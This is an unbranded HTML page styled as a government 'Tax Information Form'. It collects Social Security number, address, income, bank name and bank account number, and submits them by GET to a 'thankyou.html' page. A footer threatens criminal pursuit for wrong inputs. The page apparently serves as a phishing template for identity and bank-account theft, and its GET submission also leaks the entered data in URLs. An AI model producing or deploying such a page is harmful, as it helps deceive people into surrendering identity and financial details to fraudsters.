
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tax Information Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f9ff;
      color: #003366;
      padding: 0;
      margin: 0;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background: #ffffff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #003366;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      background-color: #005ea2;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      margin-top: 25px;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #004a82;
    }
    .disclaimer {
      margin-top: 30px;
      font-size: 12px;
      color: #555;
      text-align: center;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Tax Information Form</h2>
  <form action="thankyou.html" method="get">
    <label for="fullname">1. Full Name and Surname</label>
    <input type="text" id="fullname" name="fullname" required>

    <label for="ssn">2. Social Security Number (SSN)</label>
    <input type="text" id="ssn" name="ssn" required>

    <label for="filing-status">3. Filing Status</label>
    <select id="filing-status" name="filing-status" required>
      <option value="">Select</option>
      <option>Single</option>
      <option>Married Filing Jointly</option>
      <option>Married Filing Separately</option>
      <option>Head of Household</option>
      <option>Qualifying Widow(er)</option>
    </select>

    <label for="address">4. Address on Your Tax Return</label>
    <textarea id="address" name="address" rows="3" required></textarea>

    <label for="contact">5. Contact Number</label>
    <input type="tel" id="contact" name="contact" required>

    <label for="income">6. Total Income</label>
    <input type="number" id="income" name="income" required>

    <label for="withheld">7. Tax Withheld</label>
    <input type="number" id="withheld" name="withheld" required>

    <label for="taxyear">8. Tax Year or Form Filed (e.g. 1040, 2023)</label>
    <input type="text" id="taxyear" name="taxyear" required>

    <label for="credits">9. Deductions or Credits Claimed</label>
    <textarea id="credits" name="credits" rows="3" required></textarea>

    <label for="bankname">10. Bank Name</label>
    <input type="text" id="bankname" name="bankname" required>

    <label for="bankaccount">11. Bank Account Number</label>
    <input type="text" id="bankaccount" name="bankaccount" required>

    <button type="submit">Submit</button>
  </form>
  <div class="disclaimer">
    NOTE: For security reasons, we will record your IP address, the date and time. Deliberate wrong inputs are criminally pursued and indicated.
  </div>
</div>

</body>
</html>
